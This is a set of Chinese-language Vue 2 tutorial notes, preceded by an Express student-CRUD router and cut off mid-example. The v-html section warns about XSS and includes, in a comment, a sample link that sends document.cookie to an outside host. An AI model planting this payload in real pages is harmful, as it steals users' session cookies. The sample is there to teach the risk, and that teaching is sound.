// 2. 把路由都挂载到 router 路由容器中

/*
 * 渲染学生列表页面
 */
router.get('/students', function (req, res) {
  Student.find(function (err, students) {
    if (err) {
      return res.status(500).send('Server error.')
    }
    res.render('index.html', {
      fruits: [
        '苹果',
        '香蕉',
        '橘子'
      ],
      students: students
    })
  })
})

/*
 * 渲染添加学生页面
 */
router.get('/students/new', function (req, res) {
  res.render('new.html')
})

/*
 * 处理添加学生
 */
router.post('/students/new', function (req, res) {
  // 1. 获取表单数据
  // 2. 处理
  //    将数据保存到 db.json 文件中用以持久化
  // 3. 发送响应
  new Student(req.body).save(function (err) {
    if (err) {
      return res.status(500).send('Server error.')
    }
    res.redirect('/students')
  })
})

/*
 * 渲染编辑学生页面
 */
router.get('/students/edit', function (req, res) {
  // 1. 在客户端的列表页中处理链接问题（需要有 id 参数）
  // 2. 获取要编辑的学生 id
  // 
  // 3. 渲染编辑页面
  //    根据 id 把学生信息查出来
  //    使用模板引擎渲染页面

  // replace
  //    字符串模式
  //      简单，但是不支持全局和忽略大小写问题
  //    正则表达式模式
  //      强大，支持全局和忽略大小写
  Student.findById(req.query.id.replace(/"/g, ''), function (err, student) {
    if (err) {
      console.log(err)
      return res.status(500).send('Server error.')
    }
    res.render('edit.html', {
      student: student
    })
  })
})

/*
 * 处理编辑学生
 */
router.post('/students/edit', function (req, res) {
  // 1. 获取表单数据
  //    req.body
  // 2. 更新
  //    Student.updateById()
  // 3. 发送响应
  var id = req.body.id.replace(/"/g, '')
  Student.findByIdAndUpdate(id, req.body, function (err) {
    if (err) {
      return res.status(500).send('Server error.')
    }
    res.redirect('/students')
  })
})

/*
 * 处理删除学生
 */
router.get('/students/delete', function (req, res) {
  // 1. 获取要删除的 id
  // 2. 根据 id 执行删除操作
  // 3. 根据操作结果发送响应数据

  var id = req.query.id.replace(/"/g, '')
  Student.findByIdAndRemove(id, function (err) {
    if (err) {
      return res.status(500).send('Server error.')
    }
    res.redirect('/students')
  })
})

// 3. 把 router 导出
module.exports = router
```

>[success] # 什么是VUE
```
 构建数据驱动的web应用开发框架
，使用的是es5 中的defineProperty原理来实现的
```
>[danger] ##### vue 和传统前端相比
```
1.提高开发效率的发展历程：原生JS -> Jquery之类的类库 -> 前端模板引擎 -
 Angular.js / Vue.js（能够帮助我们减少不必要的DOM操作；提高渲染效
率；双向数据绑定的概念【通过框架提供的指令，我们前端程序员只需要关心
数据的业务逻辑，不再关心DOM是如何渲染的了】）

2.在Vue中，一个核心的概念，就是让用户不再操作DOM元素，解放了用户的
双手，让程序员可以更多的时间去关注业务逻辑；
```
>[danger] ##### MVC 和MVVM 图解
![](https://box.kancloud.cn/59a5c3ef045d592ccb5c602d6d81e87f_1364x547.png)
>[success] # 基本使用VUE
```
1.导入vue.js包
2.创建VUE实例，创建VUE实例，就是MVVM 中的VM层，用来调度视图层V和数据M的桥梁
3.创建的VUE 实例中el 是将VM 和V 层进行连接的属性，data是数据存储的M 层
```
>[danger] ##### 最简单的使用
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <!-- 1. 导入Vue的包 -->
  <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
  <!-- 将来 new 的Vue实例，会控制这个 元素中的所有内容 -->
  <!-- Vue 实例所控制的这个元素区域，就是我们的 V  -->
  <div id="app">
    <p>{{ msg }}</p>
  </div>

  <script>
    // 2. 创建一个Vue的实例
    // 当我们导入包之后，在浏览器的内存中，就多了一个 Vue 构造函数
    //  注意：我们 new 出来的这个 vm 对象，就是我们 MVVM中的 VM调度者
    var vm = new Vue({
      el: '#app',  // 表示，当前我们 new 的这个 Vue 实例，要控制页面上的哪个区域
      // 这里的 data 就是 MVVM中的 M，专门用来保存 每个页面的数据的
      data: { // data 属性中，存放的是 el 中要用到的数据
        msg: '欢迎学习Vue' // 通过 Vue 提供的指令，很方便的就能把数据渲染到页面上，程序员不再手动操作DOM元素了【前端的Vue之类的框架，不提倡我们去手动操作DOM元素了】
      }
    })
  </script>
</body>

</html>
```





    var vm2 = new Vue({
      el: '#app2',
      data: {},
      methods: {},
      filters: {},
      directives: {},
      components: { // 定义实例内部私有组件的
        login: {
          template: '#tmpl2'
        }
      },

      beforeCreate() { },
      created() { },
      beforeMount() { },
      mounted() { },
      beforeUpdate() { },
      updated() { },
      beforeDestroy() { },
      destroyed() { }
    })
[TOC]
>[success] # vue常用的指令
```
1.{{}}     -- 大胡子语法讲data中的数据显示在页面上
2.v-cloak  -- 解决大胡子语法插入表达式闪烁问题
3.v-text   -- 展示data属性中的数据在页面上，和大胡子展示不同，第一不会 
 出现闪烁问题，第二v-text会覆盖元素中原本的内容，但是 插值表达式  只
 会替换自己的这个占位符，不会把 整个元素的内容清空
4.v-html   -- 将标签语义化展示在页面上，和v-text不同，text只能纯文本展示
5.v-bind   -- 是将标签属性和data参数绑定，和v-text、v-html、大胡子语法
 不同这三者绑定的值都只会出现在标签内，缩写是:
6.v-on     -- 事件绑定机制，他所绑定是vue对象中的methods属性中的内容，缩写是@符号
7.v-model  -- 实现双向绑定，和v-text、v-html、v-bind 不同，他能双向绑
 定，及页面中数据变化，data中 数据跟着变化v-model 只能运用在 表单元素
 中，input(radio, text, address, email....)   select    checkbox   textarea
8.v-for    -- 用来循环
9.v-if 的特点：每次都会重新删除或创建元素 ，v-show 的特点： 每次不会
重新进行DOM的删除和创建操作，只是切换了元素的 display:none 样式
```
>[success] # 时间修饰符
```
1.stop 阻止冒泡

2.prevent 阻止默认事件

3.capture 添加事件侦听器时使用事件捕获模式

4.self 只当事件在该元素本身（比如不是子元素）触发时触发回调

5.once 事件只触发一次
```
>[success] # 大胡子语法配合 -- v-cloak
```
1.当语法中使用了大胡子语法插入，因为网络加载问题，一面可能在加载卡顿的时
候会出现大胡子语法的表达式显示闪烁

2.v-cloak 要在css 样式加上一句话才能使用 [v-cloak] {display: none;}

3.vue 的大胡子语法跟后台的大胡子语法基本使用情况一致，可以在大胡子中做运
算，三元表达式，运行函数，编程正则 ，例如：{{num + 1}}、{{status ? ‘succeed’ : ‘failed’}} 、
{{changeTime()}}、{value.replace(/,/g,'')}}

4.大胡子语法中可以直接使用js 用法，所以大胡子语法中加单引号或双引号实际是字符串写法
```
>[danger] ##### 案例
```
    <script src="./lib/vue-2.4.0.js"></script>
    <style>
        [v-cloak]{
            display: none;
        }
    </style>
</head>
<body>

<div id="app">
    <p v-cloak>{{ msg+1 }}</p>
</div>
<script>
    var vm = new Vue({
        el:'#app',
        // data 负责输出理数据的
        data:{
            msg:"我是Vue"
        }

    })
</script>
</body>
</html>
```
* 页面显示结果
```
我是Vue1
```
>[success] # data中对应内容展示到标签内 -- v-text
```
1.相同点v-text 和大胡子语法都能展示对应data中数据内容，也都能在数据基础上做运算
2.不同点第一大胡子语法在加载的时候会出现闪烁问题，第二v-text 会吧标
签中的内容替换，但大胡子语法不会
```
>[danger] ##### 案例
```
    <script src="./lib/vue-2.4.0.js"></script>
    <style>
        [v-cloak]{
            display: none;
        }
    </style>
</head>
<body>

<div id="app">
    <p v-cloak>{{ msg+1 }}</p>
    <!--会覆盖等号-->
    <p v-text="msg+1">=====</p>
</div>
<script>
    var vm = new Vue({
        el:'#app',
        // data 负责输出理数据的
        data:{
            msg:"我是Vue的v-text标签内只能展示我"
        }

    })
</script>
```
* 页面展示效果
```
我是Vue的v-text标签内只能展示我1

我是Vue的v-text标签内只能展示我13
```
>[success] # 将标签展示到页面上 -- v-html
```
1.将标签语义化展示在页面上，和v-text不同，text只能纯文本展示
```
>[danger] ##### 使用v-html 指令注意点
```
1.由于获取的是纯HTML，所以会产生xss 攻击，要做到下面几点
			v-html ，防止XSS（
				(1) 前端过滤
				(2) 后台转义(< >  &lt; &gt;)
				(3) 给cookie 加上属性 http
			）
			//<a href=javascript:location.href='http://www.baidu.com?cookie='+document.cookie>click</a>
```
>[danger] ##### 案例
```
    <script src="./lib/vue-2.4.0.js"></script>
    <style>
        [v-cloak]{
            display: none;
        }
    </style>
</head>
<body>

<div id="app">
    <!--语义化html标签内容-->
    <p v-html="msg">111</p>
    <p v-text="msg"></p>
</div>
<script>
    var vm = new Vue({
        el:'#app',
        // data 负责输出理数据的
        data:{
            msg:"<h1>我是Vue的v-text标签内只能展示我</h1>"
        }

    })
</script>
</body>
</html>
```
* 效果展示
![](https://box.kancloud.cn/d5014911785035e4ba36a7622883faf3_575x110.png)
>[success] # 给标签属性中添加内容 -- v-bind
```
1.v-bind 是将标签属性和data参数绑定，和v-text、v-html、大胡子语法不同
这三者绑定的值都只会出现在标签内
2.也可以作为属性进行加减法
```
>[danger] ##### 案例
```
    <script src="./lib/vue-2.4.0.js"></script>
</head>
<body>

<div id="app">
    <!--title 是a标签的属性，给属属性中绑定内容-->
    <a v-bind:title="msg + 1">111</a>
    <!--缩写-->
    <a :title="msg">111</a>
</div>
<script>
    var vm = new Vue({
        el:'#app',
        // data 负责输出理数据的
        data:{
            msg:"使用v-bind，给属性绑定内容"
        }

    })
</script>
</body>
</html>
```
* 打印结果
![](https://box.kancloud.cn/0ca320b77638f5cff5b72e5903073b13_222x70.png)
>[success] # 双向绑定 -- v-model
```
1.数据的双向绑定
2.注意： v-model 只能运用在 表单元素中 ， input(radio, text, address, email....)   select    checkbox   textarea   
2.多选框的时候应用是数组在v-model 绑定
3.修饰符<input type="text" v-model.lazy="name" />
		.lazy :失去焦点同步一次
        .number :格式化数字
		.trim : 去除首尾空格
```
>[danger] ##### 案例
```
  <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
  <div id="app">
    <h4>{{ msg }}</h4>

    <!-- v-bind 只能实现数据的单向绑定，从 M 自动绑定到 V， 无法实现数据的双向绑定  -->
    <!-- <input type="text" v-bind:value="msg" style="width:100%;"> -->

    <!-- 使用  v-model 指令，可以实现 表单元素和 Model 中数据的双向数据绑定 -->
    <!-- 注意： v-model 只能运用在 表单元素中 -->
    <!-- input(radio, text, address, email....)   select    checkbox   textarea   -->
    <input type="text" style="width:100%;" v-model="msg">
<!--span不能绑定v-model 只能给 输入的元素绑定-->
    <span  v-model="msg"></span>
  </div>

  <script>
    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        msg: '大家都是好学生，爱敲代码，爱学习，爱思考，简直是完美，没瑕疵！'
      },
      methods: {
      }
    });
  </script>
</body>

</html>
```
>[danger]  ##### 针对单选多选框的应用
```
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Examples</title>
    <meta name="description" content="">
    <meta name="keywords" content="">
    <link href="" rel="stylesheet">
    <script src="lib/vue.js"></script>
    <style>
        .red {
            background-color: red;
        }
    </style>
</head>
<body>
<div id="box">
    <!--输入框的使用-->
    <input v-model="text">
    <!--textarea 使用-->
    <textarea v-model="text"></textarea>
    <!--单选框的使用-->
    <p>记住用户名：<input type="checkbox" v-model="isChecked"/></p>

    <!--多选框 给配合input value属性,v-model 中绑定的数组 -->
    <p>
        <input type="checkbox" v-model="checkedgroud" value="vue">vue
        <input type="checkbox" v-model="checkedgroud" value="react">react
        <input type="checkbox" v-model="checkedgroud" value="jq">jq
        {{checkedgroud}}
    </p>

    <!--单选框,也是要配合radio，v-model 是主要配合单选记录内容的-->
    <p>
        <input type="radio" value="vue" name="favor" v-model="picked"/> vue
        <input type="radio" value="react" name="favor" v-model="picked"/> react
        <input type="radio" value="jquery" name="favor" v-model="picked"/> jquery
    </p>

</div>
<script type="text/javascript">
    var vm = new Vue({
        el:"#box",

        data:{
            text:"",
            isChecked:true,
            checkedgroud:[],
            picked:"react"

        },

    })
</script>
</body>
</html>
```
[TOC]
>[success] # 循环 -- v-for
```
1.v-for 可以直接循环数字从1开始
2.v-for 可以循环数组，有两个参数，一个数数组中的内容，一个是序列
3.v-for 循环数组中的对象，也是两参数一个是对象，一个是序列
in 后面我们放过  普通数组，对象数组，对象， 还可以放数字
```
* 针对数组了解更多
```
1.	列表渲染
	(1)v-for  (特殊 v-for="n in 10")
		a. in 
		b. of
	(2)key：
		*跟踪每个节点的身份，从而重用和重新排序现有元素
		*理想的 key 值是每项都有的且唯一的 id。data.id
	(3)数组更新检测 
		a. 使用以下方法操作数组，可以检测变动
	    push() pop() shift() unshift() splice() sort() reverse()
	    b. filter(), concat() 和 slice() ,map(),新数组替换旧数组
	    c. 不能检测以下变动的数组
	    	vm.items[indexOfItem] = newValue-- 这种改变数组数据无法接收到改变的
	    	*解决*  (1)Vue.set(example1.items(vm.items), indexOfItem, newValue)
	    			(2)splice-- 根据位置替换元素
	(4)应用:显示过滤结果
		-使用计算属性
```
>[danger] ##### 循环数组和数字
```
    <script src="./lib/vue-2.4.0.js"></script>
</head>
<body>
<div id="app">
<!-- <p>{{list[0]}}</p>
    <p>{{list[1]}}</p>
    <p>{{list[2]}}</p>
    <p>{{list[3]}}</p>
    <p>{{list[4]}}</p> -->

    <p v-for="i in 10">{{ i }}</p>
    <p v-for="(item, i) in list">索引值：{{i}} --- 每一项：{{item}}</p>
</div>
<script>
    var vm = new Vue({
        el:'#app',
        // data 负责输出理数据的
        data:{

            list: [1, 2, 3, 4, 5, 6]
        },

    })
</script>
</body>
</html>
```
>[danger] ##### 循环数组中的对象
```
  <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
  <div id="app">
    <p v-for="(user, i) in list">Id：{{ user.id }} --- 名字：{{ user.name }} --- 索引：{{i}}</p>
  </div>

  <script>
    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        list: [
          { id: 1, name: 'zs1' },
          { id: 2, name: 'zs2' },
          { id: 3, name: 'zs3' },
          { id: 4, name: 'zs4' }
        ]
      },
      methods: {}
    });
  </script>
</body>

</html>
```
>[danger] ##### 循环对象
```
1.三个参数 分别是，k,v,index
```
```
  <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
  <div id="app">
    <!-- 注意：在遍历对象身上的键值对的时候， 除了 有  val  key  ,在第三个位置还有 一个 索引  -->
    <p v-for="(val, key, i) in user">值是： {{ val }} --- 键是： {{key}} -- 索引： {{i}}</p>
  </div>

  <script>
    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        user: {
          id: 1,
          name: '托尼·屎大颗',
          gender: '男'
        }
      },
      methods: {}
    });
  </script>
</body>

</html>
```
>[danger] ##### v-for 中的key 让元素位置不变
```
  <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
  <div id="app">

    <div>
      <label>Id:
        <input type="text" v-model="id">
      </label>

      <label>Name:
        <input type="text" v-model="name">
      </label>

      <input type="button" value="添加" @click="add">
    </div>

    <!-- 注意： v-for 循环的时候，key 属性只能使用 number获取string -->
    <!-- 注意： key 在使用的时候，必须使用 v-bind 属性绑定的形式，指定 key 的值 -->
    <!-- 在组件中，使用v-for循环的时候，或者在一些特殊情况中，如果 v-for 有问题，必须 在使用 v-for 的同时，指定 唯一的 字符串/数字 类型 :key 值 -->
    <p v-for="item in list" :key="item.id">
      <input type="checkbox">{{item.id}} --- {{item.name}}
    </p>
  </div>

  <script>
    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        id: '',
        name: '',
        list: [
          { id: 1, name: '李斯' },
          { id: 2, name: '嬴政' },
          { id: 3, name: '赵高' },
          { id: 4, name: '韩非' },
          { id: 5, name: '荀子' }
        ]
      },
      methods: {
        add() { // 添加方法
          this.list.unshift({ id: this.id, name: this.name })
        }
      }
    });
  </script>
</body>

</html>
```
[TOC]

 
>[success] #  绑定事件 -- v-on
```
1.v-on 事件绑定机制，他所绑定是vue对象中的methods属性中的内容
,缩写是@符号
2.可以搭配浏览器端常用的触发事件
```
* 在使用的时候加不加括号的区别
```
1. 事件处理器，调用的时候不加括号则在methods 使用的时候有一个默认参
数event，当加括号要使用的时候，就给自己填这个参数 $event 事件
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>Examples</title>
<meta name="description" content="">
<meta name="keywords" content="">
<link href="" rel="stylesheet">
<script type="text/javascript" src="lib/vue.js"></script>
</head>
<body>
    <div id="box" >
        <button @click="handleClick()">click-函数表达式</button>
        <button @click="handleClick2">click-函数名字</button>
    </div>
    <script type="text/javascript">
    	var vm = new Vue({
            el:"#box",
            data:{
                count:1,
                isShow:false
            },
            methods:{
                handleClick(){
                    this.count++;
                },
                handleClick2(ev){
                    console.log(ev.target);
                    this.count++;
                },
                
            }            
        })
    	
    </script>
    <script>
    </script>
</body>
</html>	
	
```
>[danger] ##### 配合v-on使用的点击 -- click
```
1.v-on:click 绑定点击事件，他们触发的是methods 中封装的方法
```
* 案例
```
    <script src="./lib/vue-2.4.0.js"></script>
</head>
<body>

<div id="app">
    <!--给p标签绑定methods中的方法触发事件-->
    <p v-on:click="show">111</p>
    <!--缩写-->
    <p @click="show">111</p>
</div>
<script>
    var vm = new Vue({
        el:'#app',
        // data 负责输出理数据的
        data:{
            msg:"使用v-bind，给属性绑定内容"
        },
        // methods 负责处理调用方法的
        methods:{
            show:function () {
                alert("Hello")
            }
        }

    })
</script>
</body>
</html>
```
* 网页效果
![](https://box.kancloud.cn/22fccf59b28c201729959787ebca77cf_522x133.png)
>[danger] ##### v-on 案例点击对应标签变色
```
1.处理之中问题时候，点击谁，谁做什么首先，一定要获取点击对象的唯一判断值然后做逻辑操作
```
```
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Examples</title>
    <meta name="description" content="">
    <meta name="keywords" content="">
    <link href="" rel="stylesheet">
    <script src="lib/vue.js"></script>
    <style>
        .red {
            background-color: red;
        }
    </style>
</head>
<body>
<div id="box">
    <ul>
        <li v-for="mydata,myindex in list" :class="currentIndex==myindex ?'red':''" @click="handleClick(myindex)">
            {{mydata}}--{{myindex}}
        </li>
    </ul>

</div>
<script type="text/javascript">
    var vm = new Vue({
        el:"#box",

        data:{
            list:["xiaoming","xiaoqiang","kerwin","tiechui","aaa"],

            currentIndex:-1
        },
        methods:{
            handleClick(myindex){
                this.currentIndex = myindex
            }
        }
    })
</script>
</body>
</html>
```
>[danger] ##### 配合v-on 使用的键盘事件 -- keyup
* 常见的已经定义好的
```
.enter
.tab
.delete (捕获“删除”和“退格”键)
.esc
.space
.up
.down
.left
.right
```
* 自定义 网址连接
```
1.http://www.cnblogs.com/wuhua1/p/6686237.html
```
* 案例
```
1.@keyup.enter 回车触发
2.如果想触发别的按键 @keyup.112，可以去自定义网址连接找到按键的对应数字
3.自定义全局按键修饰符，Vue.config.keyCodes.f2 = 113，设定后调用f2就可以直接@keyup.f2
```
```
    <script src="./lib/vue-2.4.0.js"></script>
</head>
<body>
<div id="app">
    // 回车 显示文本框文字内容 
    <input type="text" @keyup.enter="add" v-model="inputMsg">
    <span v-text="msg"></span>
</div>
<script>


    // 自定义全局按键修饰符
    Vue.config.keyCodes.f2 = 113

    var vm = new Vue({
        el:'#app',
        data:{
            inputMsg:"",
            msg:""
        },
        methods:{
            add:function () {
                this.msg = this.inputMsg
            }
        },

    })
</script>
```

>[success] # v-if/v-show 显示 和隐藏
```
1. 条件渲染
	(1)v-if
	(2)v-else
	(3)template v-if ,包装元素template 不会被创建
，控制一组数据的时候使用template 包裹
	(4)v-show
```
* 区别
```
1.v-if 的特点：每次都会重新删除或创建元素
2.v-show 的特点： 每次不会重新进行DOM的删除和创建操作，只是切换了元素的 display:none 样式
3.v-if 有较高的切换性能消耗
4.v-show 有较高的初始渲染消耗
5. 如果元素涉及到频繁的切换，最好不要使用 v-if, 而是推荐使用 v-show
6. 如果元素可能永远也不会被显示出来被用户看到，则推荐使用 v-if 
```
>[danger] ##### 案例
```
  <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
  <div id="app">

    <!-- <input type="button" value="toggle" @click="toggle"> -->
    <input type="button" value="toggle" @click="flag=!flag">

    <!-- v-if 的特点：每次都会重新删除或创建元素 -->
    <!-- v-show 的特点： 每次不会重新进行DOM的删除和创建操作，只是切换了元素的 display:none 样式 -->

    <!-- v-if 有较高的切换性能消耗 -->
    <!-- v-show 有较高的初始渲染消耗 -->

    <!-- 如果元素涉及到频繁的切换，最好不要使用 v-if, 而是推荐使用 v-show -->
    <!-- 如果元素可能永远也不会被显示出来被用户看到，则推荐使用 v-if -->
    <h3 v-if="flag">这是用v-if控制的元素</h3>
    <h3 v-show="flag">这是用v-show控制的元素</h3>

  </div>

  <script>
    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        flag: false
      },
      methods: {
        /* toggle() {
          this.flag = !this.flag
        } */
      }
    });
  </script>
</body>

</html>
```
>[danger] #### 综合使用
```
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>Examples</title>
<meta name="description" content="">
<meta name="keywords" content="">
<link href="" rel="stylesheet">

<script type="text/javascript" src="lib/vue.js"></script>
</head>
<body>
    <div id="box">

      <div v-if="isCreated==1">
         1111111111
      </div>
      <div v-else-if="isCreated==2">
        22222222
      </div>

      <div v-else>
        3333333
      </div>
      <!-- <div v-else>我是动态创建和删除---22222</div> -->

      <div v-show ="isShow">
          我是动态隐藏和显示
      </div>


      <div v-if="datalist.length">
          <ul>
           <li v-for="data in datalist">
             
              {{data}}
           </li>
          </ul>
      </div>

      <div v-else>
        
          该用户没有订票记录
      </div>

      <template v-if="isShow">
      <div >111111</div>
      <div >222222</div>

      <div >333333</div>

      </template>
    </div>

    <script type="text/javascript">
    	 // alert("111")
    	var vm = new Vue({
    	   el:"#box",
           data:{
            isCreated:1,
            isShow:false,

            datalist:[]
           }
    	})
    </script>
</body>
</html>
```
>[success] # 事件修饰符
```
1.stop 阻止冒泡

2.prevent 阻止默认事件

3.capture 添加事件侦听器时使用事件捕获模式

4.self 只当事件在该元素本身（比如不是子元素）触发时触发回调

5.once 事件只触发一次
```
```
1.修饰符事件是跟v-on 事件绑定例如
 <a href="www.baidu.com" @click.prevent="linkClick">百度</a>
```
>[danger] ##### 阻止事件冒泡 -- stop
```
1.多个元素嵌套,有层次关系,这些元素都注册了相同的事件,如果里面的元素
的事件触发了，外面的元素的该事件自动的触发了.，注意相同事件
2.事件冒泡从里向外
3.阻止事件冒泡使用stop
```
```
    <script src="./lib/vue-2.4.0.js"></script>
    <style>
        .inner{
            width: 200px;
            height: 200px;
            background-color: darkseagreen;
        }
    </style>
</head>
<body>

<div class="inner" id="app" @click="divClick">
    <input type="button" value="点击" @click.stop="inputClick">
</div>
<script>
    var vm = new Vue({
        el:'#app',
        // data 负责输出理数据的
        data:{
      
        },
        // methods 负责处理调用方法的

        methods:{
            divClick(){
                console.log("最外层div")
            },
            inputClick(){
                console.log("最内层div")
            }

        }

    })
</script>
</body>
</html>
```
* 在页面的打印效果
```
最外层div
```
>[danger] ##### 实现捕获触发事件的机制 -- capture
```
1.冒泡是从向外依次触发，使用capture，就变成了从先显示外面，在显示里面
```
* 案例
```
    <script src="./lib/vue-2.4.0.js"></script>
    <style>
        .inner{
            width: 200px;
            height: 200px;
            background-color: darkseagreen;
        }
    </style>
</head>
<body>

<div class="inner" id="app" @click.capture="divClick">
    <input type="button" value="点击" @click="inputClick">
</div>
<script>
    var vm = new Vue({
        el:'#app',
        // data 负责输出理数据的
        data:{},
        // methods 负责处理调用方法的

        methods:{
            divClick(){
                console.log("最外层div")
            },
            inputClick(){
                console.log("最内层div")
            }

        }

    })
</script>
</body>
</html>
```
* 打印结果
```
最外层div
最内层div
```
>[danger] ##### 只会阻止自己身上冒泡行为 -- self
```
1.只会阻止自己身上冒泡行为 ,当有多层嵌套的时候，只会阻止有self 冒泡行为
```
* 案例
```
    <script src="./lib/vue-2.4.0.js"></script>
    <style>
        .inner{
            width: 200px;
            height: 200px;
            background-color: darkseagreen;
        }
    </style>
</head>
<body>
<div id="app">
<div class="outer" @click="div2Handler">
    <div class="inner" @click.self="div1Handler">
        <input type="button" value="戳他" @click="btnHandler">
    </div>
</div>
</div>
<script>
    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
        el: '#app',
        data: {},
        methods: {
            div1Handler() {
                console.log('这是触发了 inner div 的点击事件')
            },
            btnHandler() {
                console.log('这是触发了 btn 按钮 的点击事件')
            },
            div2Handler() {
                console.log('这是触发了 outer div 的点击事件')
            }
        }
    });
</script>
</body>
</html>
```
* 打印结果
```
这是触发了 btn 按钮 的点击事件
这是触发了 outer div 的点击事件
```
>[danger] ##### 只触发一次默认行为
```
1.只触一次规定的默认行为
2.下面的案例第二次点击就会跳转页面
```
```
    <script src="./lib/vue-2.4.0.js"></script>
    <style>
        .inner{
            width: 200px;
            height: 200px;
            background-color: darkseagreen;
        }
    </style>
</head>
<body>
<div id="app">
    <a href="www.baidu.com" @click.prevent.once="linkClick">百度</a>
</div>
<script>
    var vm = new Vue({
        el:'#app',
        // data 负责输出理数据的
        data:{},
        // methods 负责处理调用方法的
        methods:{
            linkClick:function () {
                alert(1)
            }
        }

    })
</script>
</body>
</html>
```
>[danger] ##### 阻止默认事件 -- prevent
```
1.例如a标签默认事件就是点击跳转页面，为了阻止a标签的默认事件触发我们绑定的事件，可以使用prevent
```
* 案例
```
    <script src="./lib/vue-2.4.0.js"></script>
</head>
<body>

<div id="app">
    <a href="www.baidu.com" @click.prevent="linkClick">百度</a>
</div>
<script>
    var vm = new Vue({
        el:'#app',
        // data 负责输出理数据的
        data:{},
        // methods 负责处理调用方法的
        methods:{
            linkClick:function () {
                alert(1)
            }
        }

    })
</script>
</body>
</html>
```
* 运行的效果
```
1.a标签不会页面跳转，反而点击后会弹出弹窗显示1
```
>[success] # 控制样式
```
1.传统的样式写法 <h1 class="red thin">我是样式</h1>
2.因为样式class是属性，因此也可以用bind 标签绑定，这时候bind可以是数组的性质包裹样式，注这时候找的不是data中的样式
3.使用三元这时候使用到data数据
```
>[danger] ##### 传统写法
```
    <style>
        .red{
            color: red;
        }
        .thin{
            font-weight:200 ;
        }
    </style>
</head>
<body>
<div id="app">
  <h1 class="red thin">我是样式</h1>
</div>
```
>[danger] ##### 使用bind的写法
```
    <script src="./lib/vue-2.4.0.js"></script>
    <style>
        .red{
            color: red;
        }
        .thin{
            font-weight:200 ;
        }
    </style>
</head>
<body>
<div id="app">
  <h1 :class="['red','thin']">我是样式</h1>
</div>
<script>
```
>[danger] ##### 三元写法
```
    <script src="./lib/vue-2.4.0.js"></script>
    <style>
        .red{
            color: red;
        }
        .thin{
            font-weight:200 ;
        }
    </style>
</head>
<body>
<div id="app">
  <h1 :class="['red',flag?'thin':'']">我是样式</h1>
</div>
<script>
    var vm = new Vue({
        el:'#app',
        // data 负责输出理数据的
        data:{

            flag:false
        },

    })
</script>
```
>[danger] ##### 三元的替代对象
```
    <script src="./lib/vue-2.4.0.js"></script>
    <style>
        .red{
            color: red;
        }
        .thin{
            font-weight:200 ;
        }
    </style>
</head>
<body>
<div id="app">
  <h1 :class="['red',{'thin':flag}]">我是样式</h1>
</div>
<script>
    var vm = new Vue({
        el:'#app',
        // data 负责输出理数据的
        data:{

            flag:false
        },

    })
</script>

```
>[danger] ##### 终极直接对象
```
    <script src="./lib/vue-2.4.0.js"></script>
    <style>
        .red{
            color: red;
        }
        .thin{
            font-weight:200 ;
        }
    </style>
</head>
<body>
<div id="app">
  <h1 :class="classObj">我是样式</h1>
</div>
<script>
    var vm = new Vue({
        el:'#app',
        // data 负责输出理数据的
        data:{

            classObj: { red: true, thin: true, }
        },

    })
</script>
</body>
</html>
```
>[danger] ##### style
```
1.直接对象
```
```
  <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
  <div id="app">
    <!-- 对象就是无序键值对的集合 -->
    <!-- <h1 :style="styleObj1">这是一个h1</h1> -->

    <h1 :style="[ styleObj1, styleObj2 ]">这是一个h1</h1>
  </div>

  <script>
    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        styleObj1: { color: 'red', 'font-weight': 200 },
        styleObj2: { 'font-style': 'italic' }
      },
      methods: {}
    });
  </script>
</body>

</html>
```
>[success] # 简单案例
 
>[danger] ##### 跑马灯效果 
![](https://box.kancloud.cn/c21a195655709c10672e8b6bc3f20135_311x75.png)
* 思路
```
1.首先点击按钮触发，文字轮播效果，使用@click 事件，用来触发methods中的函数
2.在按钮的事件处理函数中，写相关的业务逻辑代码，使用定时器：拿到 
msg 字符串，然后 调用 字符串的 substring 来进行字符串的截取操作，把 第一个字符截取出来，放到最后一个位置即可；
3.在定时器函数中要注意，一个this的执行问题，还用判断当前定时器是否存在
4.点击停止的时候销毁定时器
```
* 注意点
```
1. 在 VM实例中，如果想要获取 data 上的数据，或者 想要调用 methods 中
的 方法，必须通过 this.数据属性名  或  this.方法名 来进行访问，这里的
this，就表示 我们 new 出来的  VM 实例对象
```
* es5 写法
```
    <script src="./lib/vue-2.4.0.js"></script>
</head>
<body>

<div id="app">
    <input type="button" value="启动" @click="show">
    <input type="button" value="停止" @click="stop">
    <div>
        {{ msg }}
    </div>
</div>
<script>
    var vm = new Vue({
        el:'#app',
        // data 负责输出理数据的
        data:{
            msg:"跑马灯效果",
            intervalId:null
        },
        // methods 负责处理调用方法的

        methods:{
            show:function () {
                that = this;
                if(that.intervalId !=null) return
                that.intervalId = setInterval(function () {
                    var start = that.msg.substring(0,1)
                    var end = that.msg.substring(1)
                    that.msg = end + start
                },400)
            },
            stop:function () {
                clearInterval(this.intervalId)
